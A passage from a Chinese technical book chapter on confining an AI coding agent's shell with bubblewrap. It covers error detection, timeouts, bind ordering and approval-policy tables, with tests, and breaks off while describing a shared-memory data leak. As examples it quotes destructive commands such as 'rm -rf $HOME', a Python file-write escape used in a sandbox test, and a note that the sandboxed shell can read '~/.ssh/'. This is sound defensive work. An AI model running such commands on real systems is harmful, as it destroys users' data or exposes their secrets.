这一条是我在测量里撞出来的，不在原计划上。

先看现象。把 cwd 指到一个不在 bind 集合里的目录：

```
bwrap: Can't chdir to /tmp/elsewhere: No such file or directory
```

`/tmp/elsewhere` 在宿主机上**存在得好好的**。这条消息说的原因是错的——
真正的原因是它不在 bind 集合里。

更麻烦的是退出码。我第一次量的时候是这么写的：

```bash
bwrap ... | sed 's/^/  /'
echo "  bwrap exit=$?"
```

量出来三个失败案例全是 `exit=0`。**这是我自己的探针在说谎**——管道里的 `$?`
是 `sed` 的退出码，不是 bwrap 的。这本书第 6、14、16、18 章各有一次
"验证工具自己坏了"，这是第五次，形状完全一样：它没有报错，它报了一个
关于别的东西的数字。

去掉管道重新量：


```
$ uv run python probe_sandbox.py exits

  every setup failure below exits 1 -- so does a command that returns 1

  exit=1   chdir outside the bind set     detected as: wrapper
  exit=1   bind a source that is absent   detected as: wrapper
  exit=1   interpreter unreachable        detected as: wrapper
  exit=1   an unknown flag                detected as: wrapper
  exit=42  the command exits 42           detected as: command
  exit=0   the command succeeds           detected as: command

  `setup_failure` reads the 'bwrap: ' prefix because the exit code cannot.
```


**bwrap 建不起沙箱是 exit 1，命令跑完了返回 1 也是 exit 1。**
退出码分不开这两件事。

为什么这要紧：模型拿到 "exit code 1" 加一段看起来像命令输出的文字，
会把**容器化失败**读成**自己的命令写错了**，然后重试。这就是 F05-09 的形状
（沙箱拒绝被当成业务错误疯狂重试），从一扇新的门进来。

所以只能靠前缀：


```python
def setup_failure(output: str, returncode: int | None) -> str | None:
    """Did bwrap fail to build the sandbox, rather than the command failing?

    Returns the wrapper's own message, or `None` when this looks like an
    ordinary command result.  The caller turns the former into a tool error
    that names the sandbox -- a model told only "exit code 1" will read a
    containment failure as a bug in its own command and retry it, which is
    F05-09's shape (a sandbox denial mistaken for a business error).
    """
    if returncode != 1:
        return None
    first = output.lstrip().split("\n", 1)[0]
    if first.startswith(_BWRAP_ERROR_PREFIX):
        return first[len(_BWRAP_ERROR_PREFIX) :].strip()
    return None
```

> - 只看退出码 1：别的退出码一定是命令自己的（bwrap 搭不起来时只会退出 1）。
> - `output.lstrip().split("\n", 1)[0]`：去掉开头的空白，取第一行。
> - 第一行以 `bwrap: ` 开头，就把后面那句原因还回去；否则返回 `None`——"这是一次普通的命令失败"。

它上面那段注释记着量出来的四种失败，以及这个办法的边界：

```python
# bwrap reports its own setup failures on stderr and exits 1 -- the same exit
# code as a command that ran and returned 1.  Measured, all of these exit 1:
#
#     bwrap: Can't chdir to /tmp/elsewhere: No such file or directory
#     bwrap: Can't find source path /definitely/not/here: No such file or directory
#     bwrap: execvp /bin/sh: No such file or directory
#     bwrap: Unknown option --not-a-real-flag
#
# while `sh -c 'exit 42'` correctly propagates 42.  So exit codes cannot tell
# the two apart and the prefix has to.  This is a heuristic and it is worth
# being honest about its edge: a command whose own output begins with `bwrap: `
# would be misread.  The alternative -- `--info-fd` on a separate pipe -- is
# strictly better and is left as an exercise, because it costs a second
# reader in `shell.run` for a case measured at zero occurrences.
_BWRAP_ERROR_PREFIX = "bwrap: "
```


这是个启发式，它的边界要说明白：一条命令如果自己的输出以 `bwrap: ` 开头，
就会被误判。更好的做法是 `--info-fd`，用一根独立的管道拿状态——
代价是 `shell.run` 里多一个读取器，为一个实测发生零次的情况。
留作练习，并且**在 README 里写明了这是个已知的洞**，而不是假装它不存在。

`shell.run` 里对应的分支：


```python
elif proc.returncode != 0:
    # Before reporting an exit code, ask whether the *wrapper* failed
    # rather than the command.  bwrap exits 1 for "I could not build
    # the sandbox" and a command exits 1 for "I ran and said no", and
    # measurement says the exit code cannot tell them apart -- see
    # `sandbox.setup_failure`.  Handing the raw text to the model
    # produces F05-09's fault with a new cause: a containment failure
    # read as a business error, and retried.
    failure = setup_failure(out, proc.returncode) if self.sandbox is not None else None
    if failure is not None:
        return tool_error(
            f"the sandbox could not be built, so the command did not run: {failure}",
            you_sent=command,
            do_this=(
                "This is a configuration problem, not a problem with the "
                "command -- running it again will fail the same way. Report "
                "it rather than retrying."
            ),
        )
```


最后那句 "Report it rather than retrying" 是写给模型看的，不是写给人看的。


三个测试，各守一条规则：

```python
def test_F20_05_a_wrapper_failure_is_told_apart_from_a_command_failure() -> None:
    """Measured (`probe_sandbox.py exits`): every bwrap setup failure exits 1,
    and so does a command that ran and returned 1. The exit code cannot
    separate them, so the prefix has to."""
    assert setup_failure("bwrap: Can't chdir to /nope: No such file or directory", 1) is not None
    assert setup_failure("make: *** No targets specified.  Stop.", 1) is None


def test_F20_05_only_exit_code_one_is_examined() -> None:
    """A command exiting 42 is a command, whatever it printed."""
    assert setup_failure("bwrap: something", 42) is None
    assert setup_failure("bwrap: something", 0) is None


def test_F20_05_the_message_survives_leading_whitespace() -> None:
    assert setup_failure("\n  bwrap: Unknown option --nope\n", 1) == "Unknown option --nope"
```

### 5.1 改写时发现：一个"在运行之前检查"、却没人调用的方法

第一版 `BubblewrapSandbox` 里还有一个方法，`chdir_is_reachable(cwd)`。它的说明写着：

> Asked *before* running, because of how bwrap reports the failure.

它还有一个测试，名字叫 `test_F20_05_an_unreachable_cwd_is_detected_before_running`。

可是整个程序里，**除了那个测试，没有任何代码调用它**——`shell.run` 不调，别的地方也不调。名字和说明都在描述一件没有发生的事："在运行之前检测"。真正处理"`--chdir` 进不去"的，是上面的 `setup_failure`：bwrap 退出 1，第一行是 `bwrap: Can't chdir to ...`，被识别成沙箱的失败。

而且在 `--ro-bind / /` 下，宿主机上的每个目录在沙箱里都在，`--chdir` 只会因为"这个目录根本不存在"而失败——而 `ShellSession` 的 `cd` 本来就不会进入一个不存在的目录。

一个没人调用的方法，加上一个名字承诺了它会被调用的测试，比没有这个方法更糟：读代码的人会以为程序在运行前检查了 cwd。改写时把这个方法和它的测试删了，`--chdir` 那里的注释改成说实话（§6.1 的代码）。对应的那条变异也一起删了——它变异的是一段没人用的代码，被抓住只能证明那个测试在测它自己。

---

## §6 F20-06：超时必须穿过包装层

第 2 章的 F02-01 给命令加了超时，靠的是 `_kill_group` 杀掉整个进程组——
因为 `shell=True` 意味着命令是 shell 的子进程，只杀 shell 会留下一个没人看管的孙子。

现在中间多了一层 bwrap。杀 bwrap 会带走里面的东西吗？


```
$ uv run python probe_sandbox.py kill

  'sleep 300' processes before killpg: 5
  'sleep 300' processes after  killpg: 0
```


会——但这不是白来的，是 `--unshare-pid` 换来的：

```python
argv += ["--unshare-pid", "--die-with-parent"]
```

有了 PID 命名空间，bwrap 在里面是 pid 1。杀 pid 1，内核收走整个命名空间和
里面所有进程。没有这个 flag，bwrap 死了，payload 的子进程还在。

`--die-with-parent` 是同一个保证的另一端：agent 进程如果没来得及跑自己的清理
就死了，内核负责把 payload 拆掉，而不是留一堆孤儿。


```python
def test_F20_06_the_pid_namespace_is_requested(tmp_path: Path) -> None:
    """Chapter 2's `_kill_group` kills a process group. With `--unshare-pid`
    bwrap is pid 1 inside the namespace, so killing it takes everything with
    it -- measured at five descendants before, zero after."""
    argv = _wrap("workspace-write", tmp_path)
    assert "--unshare-pid" in argv
    assert "--die-with-parent" in argv
```

### 6.1 代码：`Sandbox`、`NoSandbox`、`BubblewrapSandbox`

`shell.run` 怎么向沙箱要一条命令行——一个两个方法的 Protocol（第 5 章的 `Approver` 是同一种写法）：

```python
class Sandbox(Protocol):
    """How `shell.run` asks for a boundary.

    Two methods, and the second one is the interesting half.  `wrap` is called
    per command; `unavailable` is called once, at startup, and exists because
    a sandbox that turns out to be missing at the first command has already
    told the user their session was protected (F20-02).
    """

    def wrap(self, command: str, *, cwd: str) -> list[str] | None:
        """argv to run instead of `command`, or `None` to run it unwrapped."""
        ...

    def unavailable(self) -> str | None:
        """Why this sandbox cannot enforce anything, or `None` if it can."""
        ...
```

> - `wrap(command, cwd=...)`：给一条命令，返回要真正运行的 argv；返回 `None` 表示"不用包，原样跑"。
> - `unavailable()`：这个沙箱能不能真的执行。返回一句原因，或者 `None`（能）。说明讲了它为什么是一个**启动时**的检查（F20-02）：等到第一条命令才发现沙箱不在，用户已经以为自己被保护了。

"没有沙箱"，明说出来：

```python
class NoSandbox:
    """No boundary, said out loud.

    Not the same thing as `sandbox=None`.  `None` is "this caller predates
    chapter 20"; this class is "somebody decided".  Keeping them distinct is
    what lets `unavailable()` be a startup check rather than a guess -- an
    explicit `NoSandbox` under `read-only` is a misconfiguration worth
    refusing, and an implicit `None` is nineteen chapters of tests.
    """

    def wrap(self, command: str, *, cwd: str) -> list[str] | None:
        return None

    def unavailable(self) -> str | None:
        return "no sandbox was configured, so nothing is enforced"
```

> 和 `sandbox=None` 不是一回事。`None` 是"这个调用者早于第 20 章"；`NoSandbox()` 是"有人决定了不要"——所以它的 `unavailable()` 会说"什么都没有强制"。

真正的那个：

```python
@dataclass(frozen=True)
class BubblewrapSandbox:
    """A `bwrap` command line built from a `SandboxSpec`.

    Stateless and frozen: `wrap` is a pure function of the spec and the cwd,
    which is what makes the whole of this module testable on a machine with no
    `bwrap` and no Linux (the tests assert on argv; `probe_sandbox.py` asserts
    on kernels).
    """

    spec: SandboxSpec
    binary: str = BWRAP

    def unavailable(self) -> str | None:
        found = shutil.which(self.binary)
        if found is None:
            return (
                f"{self.binary!r} is not on PATH, so commands cannot be confined. "
                f"Install bubblewrap (apt install bubblewrap) or run with "
                f"--sandbox full-access if you accept an unconfined shell."
            )
        return None

    def wrap(self, command: str, *, cwd: str) -> list[str] | None:
        # `full-access` is not wrapped at all.  Wrapping it with everything
        # bound read-write would cost a process and a namespace to achieve
        # exactly nothing, and -- worse -- it would make the sandbox look
        # engaged in `ps` output while enforcing no boundary.  An honest
        # absence beats a decorative presence.
        if self.spec.mode == "full-access" and self.spec.network:
            return None

        argv = [self.binary]

        # Everything readable, nothing writable -- then holes.  See `_ROOT`
        # above for why this is a measurement rather than a preference.
        argv += ["--ro-bind", _ROOT, _ROOT]

        # `as_posix()`, for `_ROOT`'s reason: these are paths inside a Linux
        # namespace, whatever host is building the command line.
        for path in self.spec.writable():
            argv += ["--bind", path.as_posix(), path.as_posix()]

        # Chapter 16's memory directory, and anything else the caller has
        # already granted `read_file`.  Everything is readable already (see
        # `SandboxSpec`), so what this buys is a read-only *window* inside a
        # writable hole -- and that only works because it is bound *after*
        # the holes: bwrap applies binds in order and the last one wins, so a
        # read root bound first would be re-mounted writable by the workspace.
        for path in self.spec.read_roots:
            argv += ["--ro-bind-try", str(path), str(path)]

        # `/proc` and `/dev` are not inherited through a new namespace; a
        # payload without them fails in ways that look like the command's
        # fault rather than the wrapper's (`python` needs /proc for a
        # surprising amount, and anything writing to /dev/null needs /dev).
        argv += ["--dev", "/dev", "--proc", "/proc"]

        if not self.spec.network:
            argv.append("--unshare-net")

        # `--unshare-pid` is what makes the timeout work.  Chapter 2's
        # `_kill_group` kills the process group; with a PID namespace bwrap is
        # pid 1 inside it, and killing pid 1 takes the namespace and every
        # process in it.  Measured (`probe_sandbox.py kill`): five descendants
        # before the kill, zero after.
        #
        # `--die-with-parent` is the same guarantee from the other end -- if
        # the agent process dies without running its own cleanup, the kernel
        # tears the payload down instead of leaving it orphaned.
        argv += ["--unshare-pid", "--die-with-parent"]

        # `--chdir` rather than passing `cwd=` to the subprocess: the path has
        # to be resolved *inside* the namespace, and the two are not the same
        # directory.  Under `--ro-bind / /` every host directory is present,
        # so `--chdir` fails only for one that does not exist -- and then bwrap
        # exits 1 with `bwrap: Can't chdir to ...`, which `setup_failure`
        # below reports as the sandbox's failure rather than the command's.
        argv += ["--chdir", cwd]

        # `/bin/sh -c`, so that everything chapters 2 to 19 assume about shell
        # syntax -- pipes, `&&`, redirects, quoting -- still holds inside the
        # boundary.  Swapping to `create_subprocess_exec` without this would
        # silently change what a command *means*, which is a much bigger
        # behaviour change than adding a sandbox.
        argv += ["/bin/sh", "-c", command]
        return argv
```

> - `@dataclass(frozen=True)`，只有一个 `spec` 和一个程序名：`wrap` 是一个**纯函数**——同样的输入永远得到同样的命令行，不碰文件系统，不启动进程。这就是为什么这个模块在没有 bwrap 的 Windows 上也能测（§10）。
> - **`unavailable()`**：`shutil.which` 找不到就返回一句话——缺了什么、怎么装、不想装的话怎么办（用 `full-access`）。
> - **`wrap()`**，从上往下就是 §3–§7 讲过的每一条：
>   - `full-access` 而且有网：不包，返回 `None`（§13 的 Code review 讲为什么不"包了也等于没包"）。
>   - `--ro-bind / /`：整棵树只读（§3）。
>   - 每个可写路径一个 `--bind`（§3、§4.2）。`as_posix()`：这些是 Linux 命名空间里的路径，用 `/` 写——和 `_ROOT` 是同一个理由（§3.1）。
>   - 每个额外只读目录一个 `--ro-bind-try`，放在可写的洞**后面**（§7）。
>   - `--dev /dev --proc /proc`：新的命名空间里没有这两个，很多程序离不开它们。
>   - 不要网就 `--unshare-net`（§4）。
>   - `--unshare-pid --die-with-parent`（本节上面）。
>   - `--chdir cwd`：在命名空间**里面**切换目录（§5.1）。
>   - 最后 `/bin/sh -c command`：命令仍然交给 shell 解释，管道、`&&`、重定向的意思都不变。

测试——三个模式各自的命令行，一个对着真的内核（要 bwrap），以及"命令在最后、shell 语法在边界里仍然成立"：

```python
def _wrap(mode: str, root: Path, command: str = "echo hi", **kw: object) -> list[str]:
    sandbox = BubblewrapSandbox(SandboxSpec.for_mode(mode, root, **kw))  # type: ignore[arg-type]
    argv = sandbox.wrap(command, cwd=str(root))
    assert argv is not None
    return argv


def _pairs(argv: list[str], flag: str) -> list[tuple[str, str]]:
    """Every `(src, dst)` for one bind flag, in the order bwrap will apply them."""
    return [
        (argv[i + 1], argv[i + 2])
        for i, tok in enumerate(argv)
        if tok == flag and i + 2 < len(argv)
    ]


def test_F20_01_read_only_binds_nothing_writable(tmp_path: Path) -> None:
    """The mode's whole promise, as a property of the command line.

    F05-04 is the reason this is worth a test rather than a comment: chapter
    5 measured `python -c "open('x','w')"` writing happily in this mode, and
    its own note says tokenising "tells you nothing" about a path inside a
    string argument. Nothing about the *command* can fix that. What fixes it
    is that there is no writable path in the namespace at all.
    """
    argv = _wrap("read-only", tmp_path)
    assert _pairs(argv, "--bind") == []
    assert ("/", "/") in _pairs(argv, "--ro-bind")


def test_F20_01_workspace_write_binds_the_workspace_and_nothing_else(tmp_path: Path) -> None:
    argv = _wrap("workspace-write", tmp_path)
    assert _pairs(argv, "--bind") == [(str(tmp_path.resolve()), str(tmp_path.resolve()))]


def test_F20_01_full_access_is_not_wrapped_at_all(tmp_path: Path) -> None:
    """An honest absence rather than a decorative presence.

    Wrapping `full-access` with everything bound read-write would spend a
    process and a namespace to enforce nothing, and would put `bwrap` in `ps`
    output for a session that has no boundary. Somebody reading that output
    would conclude the wrong thing.
    """
    sandbox = BubblewrapSandbox(SandboxSpec.for_mode("full-access", tmp_path))
    assert sandbox.wrap("echo hi", cwd=str(tmp_path)) is None


@needs_bwrap
def test_F20_01_an_interpreter_cannot_write_in_read_only(tmp_path: Path) -> None:
    """F05-04's payload, against a kernel. Measured: `OSError: [Errno 30]`."""
    import subprocess

    target = tmp_path / "escaped.txt"
    argv = _wrap("read-only", tmp_path, f"python3 -c \"open('{target}','w').write('x')\"")
    got = subprocess.run(argv, capture_output=True, text=True, timeout=30)
    assert got.returncode != 0
    assert not target.exists()


def test_the_sandboxed_argv_ends_with_the_command(tmp_path: Path) -> None:
    argv = _wrap("read-only", tmp_path, "echo hi")
    assert argv[-3:] == ["/bin/sh", "-c", "echo hi"]


@needs_bwrap
async def test_shell_syntax_still_works_inside_the_boundary(tmp_path: Path) -> None:
    """`create_subprocess_exec` replaces `create_subprocess_shell` on the
    sandboxed path, so the shell has to be put back explicitly -- `/bin/sh -c`
    is the tail of every argv. Without it, pipes and `&&` would silently stop
    meaning what nineteen chapters of tool descriptions say they mean."""
    shell = ShellSession(
        cwd=str(tmp_path),
        sandbox=BubblewrapSandbox(SandboxSpec.for_mode("workspace-write", tmp_path)),
    )
    assert (await shell.run("echo hello && echo world | tr a-z A-Z")).strip() == "hello\nWORLD"
```

> - `_wrap`：造一个沙箱、包一条命令、断言确实包了。`_pairs(argv, "--bind")`：找出命令行里每个 `--bind` 后面跟着的那一对路径。
> - 带 `@needs_bwrap` 的两个会真的启动 bwrap（§10）。

---

## §7 F20-07：两个边界，管的不是同一件事

第 16 章为了让 `read_file` 够得到 `~/.minicodex/memories`，给 `paths.resolve()` 加了 `extra_roots`：一个 **Python 层**的边界——`read_file` 只能读工作区和这几个额外的目录。

现在 `run_shell` 有了一个**内核层**的边界。`SandboxSpec` 也有一个 `read_roots` 字段，用来放同一批额外的目录。

第一版的这一节说："两个机制，一个意图。一个路径加进了其中一个、没加进另一个，就会得到一个 `read_file` 读得到、`cat` 读不到的文件。"——言下之意：shell 要读到记忆目录，必须单独告诉内核。

### 7.1 改写时发现：反过来了

在一台有 bwrap 的机器上量了一下。`read-only` 模式，记忆目录放在工作区外面，一次带 `read_roots`、一次不带，用 `cat` 去读它；再在 `workspace-write` 模式里，把一个工作区**里面**的目录设成 read root，往里面写：

```
$ uv run python read20.py
read-only, no read_roots            cat outside the workspace -> exit=0 secret-ish memory
read-only, read_roots=(memories,)   cat outside the workspace -> exit=0 secret-ish memory
workspace-write, read root inside the workspace, append -> exit=2 /bin/sh: 1: cannot create /tmp/tmpmpkxm1ys/notes/keep.md: Read-only file system
```

**带不带 `read_roots`，shell 都读得到。** 原因就在 §3：这个沙箱的形状是"`--ro-bind / /`，再打可写的洞"——宿主机上每一个文件都已经只读地在里面了。`read_roots` 对"能不能读"没有任何影响。

它唯一的作用是第三行：**一个位于可写工作区里面的目录，变成只读。**

所以两个边界不是一个意图的两份实现，它们管的是不同的事：

| | `read_file`（第 16 章，Python） | `run_shell`（这一章，内核） |
|---|---|---|
| 能读什么 | 工作区 + `extra_roots` | **宿主机上的一切** |
| 能写什么 | （`apply_patch`）工作区 | 按模式：什么都不能 / 工作区 / 一切 |
| 能不能联网 | 不适用 | 按开关 |

真正的不对称是**反过来**的：有很多文件 `cat` 读得到、`read_file` 读不到——`~/.ssh/` 下面的东西、别的项目、别人的记忆目录（§9）。这不是一个 bug：codex 默认的沙箱策略同样允许读整个磁盘，挡的是写和网络。但它值得说清楚，因为第一版的说法会让人以为 shell 的读也被关在一个范围里。在 `read-only` 加上**打开网络**的配置下，"能读一切"和"能往外发"同时成立。

`SandboxSpec` 的说明和 `wrap()` 里那段注释改成了上面这个说法（§4.1、§6.1 的代码）。

### 7.2 那 `read_roots` 什么时候有用

两个细节，第一版就量对了：

**用 `--ro-bind-try` 不是 `--ro-bind`。** 绑一个不存在的源路径，bwrap 直接拒绝启动：

```
bwrap: Can't find source path /definitely/not/here: No such file or directory
```

一个从没写过记忆的用户，`~/.minicodex/memories` 不存在。用 `--ro-bind` 的话，他得到的不是"没有记忆"，是**没有 shell**。

**只读的绑定要放在可写的洞之后。** bwrap 按顺序应用，后面的覆盖前面的。一个位于工作区内部的只读目录，如果先绑，会被随后的可写工作区重新挂成可写——悄悄拆掉刚加的那道墙。上面量出来的第三行，靠的就是这个顺序。

四个测试：

```python
def test_F20_07_extra_read_roots_reach_the_bind_set(tmp_path: Path) -> None:
    """Chapter 16 gave `read_file` a second boundary so it could reach
    `~/.minicodex/memories`. That boundary is enforced in Python. The sandbox
    already lets the shell *read* everything (`--ro-bind / /`), so what
    passing the same root here buys is that it stays read-only inside a
    writable workspace -- see the two tests below.
    """
    memories = tmp_path / "home" / "memories"
    memories.mkdir(parents=True)
    argv = _wrap("read-only", tmp_path / "ws", read_roots=(memories,))
    assert (str(memories.resolve()), str(memories.resolve())) in _pairs(argv, "--ro-bind-try")


def test_F20_07_a_read_root_is_bound_after_the_writable_holes(tmp_path: Path) -> None:
    """Order matters to bwrap -- last bind wins. A read root that lands before
    the writable workspace would be re-mounted read-write by it, silently
    widening the very boundary it was added to narrow."""
    ws = tmp_path / "ws"
    ws.mkdir()
    inner = ws / "memories"
    inner.mkdir()
    argv = _wrap("workspace-write", ws, read_roots=(inner,))
    assert argv.index("--bind") < argv.index("--ro-bind-try")


def test_F20_07_a_missing_read_root_does_not_stop_the_session(tmp_path: Path) -> None:
    """`--ro-bind-try`, not `--ro-bind`: measured, binding an absent source
    makes bwrap refuse to start at all. A user who has never written a memory
    would get no shell rather than no memory."""
    argv = _wrap("read-only", tmp_path, read_roots=(tmp_path / "never-created",))
    assert "--ro-bind-try" in argv
    assert "--ro-bind-try" not in argv[: argv.index("--ro-bind-try")]


@needs_bwrap
def test_a_read_root_inside_the_workspace_cannot_be_written(tmp_path: Path) -> None:
    """What `read_roots` is actually for. Reading needs no bind at all under
    `--ro-bind / /`; a read root earns its place by staying read-only inside
    a writable hole."""
    import subprocess

    ws = tmp_path / "ws"
    inner = ws / "memories"
    inner.mkdir(parents=True)
    (inner / "MEMORY.md").write_text("keep\n")
    argv = _wrap("workspace-write", ws, f"echo more >> {inner / 'MEMORY.md'}", read_roots=(inner,))
    got = subprocess.run(argv, capture_output=True, text=True, timeout=30)
    assert got.returncode != 0
    assert (inner / "MEMORY.md").read_text() == "keep\n"
```

> - 最后一个是改写时加的，要 bwrap：它测的是 `read_roots` **真正**做的那件事。第一个测试的说明也改了——原来那句"一个工具读得到、另一个读不到"是错的。

---

## §8 意外的回报：沙箱换来的是**更少的确认框**

这一条我事先没想到，是写到 `policy.py` 才发现的。

看第 5 章那张表：


（`policy.py`，第 5 章写的那张表；`workspace-write` 那一行只有 `READ`。）

```python
_SHELL_ALLOWED_BY_MODE: dict[SandboxMode, frozenset[Risk]] = {
    "read-only": frozenset({Risk.READ}),
    "workspace-write": frozenset({Risk.READ}),
    "full-access": frozenset(Risk),
}
```


`workspace-write` 只允许 `READ`。**在这个以"写"命名的模式里，写操作还是要问。**

第 5 章解释过为什么：

> "Write inside the workspace" is a statement about *where* bytes land, and
> for a shell command there is no way to find that out short of running it —
> `rm -rf $HOME`, `rm -rf build` and `rm -rf ../../..` are the same shape.

这句话在没有沙箱的时候完全正确。有了沙箱之后，**它不再正确了**——
字节落在哪里现在由 bind 集合决定，内核会回答这个问题。

于是有了第二张表：


```python
# The same table, for a session that chapter 20's sandbox is actually holding.
# Three differences, and each is a thing the kernel now knows that the parser
# never could:
#
#   `workspace-write` gains WRITE   -- the bind set decides where bytes land,
#                                      so "inside the workspace" is enforced
#                                      rather than hoped for.
#   `workspace-write` gains
#   INTERPRETER                     -- F05-04's `python -c "open(...)"` is the
#                                      reason WRITE could not be granted, and
#                                      it is confined by the same bind set.
#                                      Measured: `OSError: [Errno 30]
#                                      Read-only file system` outside the
#                                      workspace, write allowed inside.
#   `read-only` gains INTERPRETER   -- for the same reason, one mode down: an
#                                      interpreter under `--ro-bind / /` with
#                                      no writable hole cannot write anywhere.
#
# NETWORK stays out of both.  `--unshare-net` means a network command cannot
# reach anything, so it is not *dangerous* -- but it will fail in a way the
# model reads as a broken environment, and F05-09 measured what that costs
# (a sandbox denial mistaken for a business error, retried forever).  Asking
# is how the user gets the chance to say "yes, and turn the network on".
_CONFINED_ALLOWED_BY_MODE: dict[SandboxMode, frozenset[Risk]] = {
    "read-only": frozenset({Risk.READ, Risk.INTERPRETER}),
    "workspace-write": frozenset({Risk.READ, Risk.WRITE, Risk.INTERPRETER}),
    "full-access": frozenset(Risk),
}
```


`INTERPRETER` 进来了，而这正是 F05-04 的那条命令。它当初之所以危险，
是因为字符串参数里可以藏一次写入；现在那次写入被同一个 bind 集合挡着。

**这不只是安全性，这是可用性。** F05-06 实测审批疲劳是每个任务 2–4 次确认框，
而它减掉的恰恰是那些"因为答案不可知所以只能问人"的确认框——
也就是用户最容易不看就点同意的那一批。

`NETWORK` 两张表里都没有，这是刻意的。`--unshare-net` 让网络命令变得
**无害**，但不是**成功**；它会以一种模型读成"环境坏了"的方式失败，
而 F05-09 量过那个代价。问一句，用户才有机会说"是的，把网开了"。

而且 `confined` 默认是 `False`：


```python
def judge_command(
    command: str,
    *,
    mode: SandboxMode,
    policy: ApprovalPolicy,
    confined: bool = False,
) -> Verdict:
    """Decide what happens to one `run_shell` command.

    Remembered rules are applied by the caller (`approval.gate`), not here, so
    that this function stays a pure statement of policy and can be tested
    without a rule store.

    `confined` says an OS sandbox is enforcing this mode, and it is chapter
    20's whole return on investment.  The table below grants `workspace-write`
    only `{Risk.READ}` -- writing asks, even in the mode named for writing --
    because until chapter 20 there was no way to know *where* a shell command's
    bytes would land.  With bubblewrap holding the boundary the question is
    answered by the kernel, so the prompt stops being a way of finding out and
    becomes a ritual.

    Defaults to `False`, so a caller who has not thought about it gets the
    nineteen-chapter behaviour rather than a quieter agent it did not ask for.
```

> 在 `judge_command` 的函数体里，改动只有这两行：

```python
allowed = _SHELL_ALLOWED_BY_MODE[mode]
if confined:
    allowed = _CONFINED_ALLOWED_BY_MODE[mode]
```

> `confined=True` 就换成第二张表，其余判断逻辑（最危险的那一段决定整条命令、`unless-trusted` 只放行纯读）完全不变。


没想过这件事的调用方拿到的是十九章以来的行为，不是一个它没要求过的、
更安静的 agent。


`policy_tables()`（第 5 章写给测试和 `/api/policy` 用的"把所有规则表列出来"）多了两项，把两张表都钉住：

```python
    # Both mode tables, because chapter 20 made the difference between
    # them a security property.  An entry quietly added to the confined
    # table grants an unprompted capability to every sandboxed session,
    # and it would look exactly like an entry that belongs there.
    "SHELL_ALLOWED_BY_MODE": [
        f"{mode}: {', '.join(sorted(r.name for r in risks))}"
        for mode, risks in sorted(_SHELL_ALLOWED_BY_MODE.items())
    ],
    "CONFINED_ALLOWED_BY_MODE": [
        f"{mode}: {', '.join(sorted(r.name for r in risks))}"
        for mode, risks in sorted(_CONFINED_ALLOWED_BY_MODE.items())
    ],
}
```

`tests/test_approval.py` 里那份"所有规则表的样子"跟着多了两项（第 5 章的做法：表的任何改动都要在测试里写一遍，悄悄改一张表就会让测试变红）：

```python
# Chapter 20. Two tables rather than one because enforcement changed what
# the judgement layer is allowed to permit without asking: with an OS
# sandbox holding the boundary, `workspace-write` can finally mean writes.
# Pinned here with everything else, and for a sharper reason than the
# command lists above -- a risk quietly added to the *confined* table
# grants an unprompted capability to every sandboxed session.
"SHELL_ALLOWED_BY_MODE": [
    "full-access: INTERPRETER, NETWORK, READ, UNKNOWN, WRITE",
    "read-only: READ",
    "workspace-write: READ",
],
"CONFINED_ALLOWED_BY_MODE": [
    "full-access: INTERPRETER, NETWORK, READ, UNKNOWN, WRITE",
    "read-only: INTERPRETER, READ",
    "workspace-write: INTERPRETER, READ, WRITE",
],
```

测试：

```python
def test_F20_01_confinement_lets_workspace_write_allow_writes() -> None:
    """F05-06 measured approval fatigue at 2-4 prompts per task. The prompts
    this removes are the ones that existed only because *where* the bytes
    landed was unknowable."""
    unconfined = judge_command("rm -rf build", mode="workspace-write", policy="on-request")
    confined = judge_command(
        "rm -rf build", mode="workspace-write", policy="on-request", confined=True
    )
    assert unconfined.decision is Decision.ASK
    assert confined.decision is Decision.ALLOW
    assert confined.risk is Risk.WRITE


def test_F20_01_confinement_does_not_open_the_network() -> None:
    """`--unshare-net` makes a network command harmless, not successful. It
    still asks, because F05-09 measured what a silent denial costs: the model
    reads it as a broken environment and retries."""
    confined = judge_command(
        "curl https://example.com", mode="workspace-write", confined=True, policy="on-request"
    )
    assert confined.decision is Decision.ASK


def test_F20_01_confinement_is_off_by_default() -> None:
    """A caller who has not thought about it gets nineteen chapters of
    behaviour, not a quieter agent it never asked for."""
    assert judge_command("rm -rf build", mode="workspace-write", policy="on-request").decision is (
        Decision.ASK
    )


def test_both_mode_tables_are_pinned() -> None:
    """An entry quietly added to the confined table grants an unprompted
    capability to every sandboxed session, and looks exactly like an entry
    that belongs there. Chapter 5 pinned the classification tables for this
    reason; chapter 20 makes the difference between two tables a security
    property."""
    tables = policy_tables()
    assert tables["SHELL_ALLOWED_BY_MODE"] == [
        "full-access: INTERPRETER, NETWORK, READ, UNKNOWN, WRITE",
        "read-only: READ",
        "workspace-write: READ",
    ]
    assert tables["CONFINED_ALLOWED_BY_MODE"] == [
        "full-access: INTERPRETER, NETWORK, READ, UNKNOWN, WRITE",
        "read-only: INTERPRETER, READ",
        "workspace-write: INTERPRETER, READ, WRITE",
    ]
```

> 再说一遍 §0.4：程序里没有任何地方传 `confined=True`。这一节讲的"更少的确认框"，在第 20 章的 `minicodex` 里不会发生。

---

## §9 F20-08：忠实的移植，在有第二个用户的瞬间变成数据泄漏

这是本章最值得写的一条，而且它不是一个 bug——**它是一段写得很好的文档。**

`web/runtime.py` 里 `load_feature_dirs` 的 docstring：

> Memory is global — `~/.minicodex/memories`, codex's
> `codex_home.join("memories")` (`memories/read/src/lib.rs:13-15`) — so every
> workspace this server hosts shares one, exactly as every project on one
> machine shares one in codex.

每一个分句都是对的：

- 记忆确实是全局的（第 16 章 F16-10 就是把它从仓库里搬出来的）
- codex 确实是 `codex_home.join("memories")`
- codex 里一台机器上每个项目确实共享一份

**结论是一个数据泄漏。**

"一台机器上的每个项目"是**一个人的**项目。
"这台服务器托管的每个工作区"是**所有人的**。

移植是忠实的。是**信任模型在它脚底下换掉了**——第 19 章把 agent 放到了
HTTP 服务器后面。而类型系统里没有任何东西发现这件事，因为
**从来就没有一个类型表示"谁"**。

### 9.1 `Owner`：这一章只加这条缝


```python
"""Whose data is this.

For nineteen chapters the answer was "the person at the keyboard", and it was
never written down anywhere because it never had to be.  One machine, one
home directory, one `~/.minicodex/`.  Every path in the program is either
relative to a repository or absolute under that home, and both spellings mean
the same person.

Chapter 19 put the agent behind an HTTP server, and chapter 16 had just moved
memory from the repository to the home directory -- correctly, because codex
keeps it at `codex_home.join("memories")` and a memory is a fact about a
person rather than about a checkout.  Put those two changes together and
`web/runtime.py:load_feature_dirs` ends up documenting this, in a docstring
that reads as a design note:

    Memory is global -- `~/.minicodex/memories` ... -- so every workspace this
